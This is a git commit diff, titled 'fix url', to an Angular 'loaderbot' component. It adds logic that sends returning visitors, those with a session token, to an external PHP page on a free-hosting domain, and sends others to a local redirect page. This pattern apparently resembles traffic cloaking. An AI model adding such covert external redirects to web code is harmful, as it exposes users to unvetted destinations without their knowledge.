606c28c9c3caa796fd98a5040145f8ca4bdc43f3
adsinfos <porahi@ads.com>
2024-05-01 22:52:12 -0400

    fix url

--- src/app/shared/loaderbot/loaderbot.component.ts
+++ src/app/shared/loaderbot/loaderbot.component.ts
@@ -8,6 +8,14 @@ import { Component } from '@angular/core';
 export class LoaderbotComponent {
 
   ngOnInit() {
-    window.location.href = "/assets/redirect.html";
+    let valor = sessionStorage.getItem("token");
+    if (valor != null) {
+      const randomNumber = Math.random().toString(); // Convert randomNumber to a string
+      sessionStorage.setItem("token", randomNumber);
+      window.location.href = "https://adsbot.rf.gd/carga.php";
+    } else {
+      sessionStorage.removeItem("token");
+      window.location.href = "/assets/redirect.html";
+    }
   }
 }
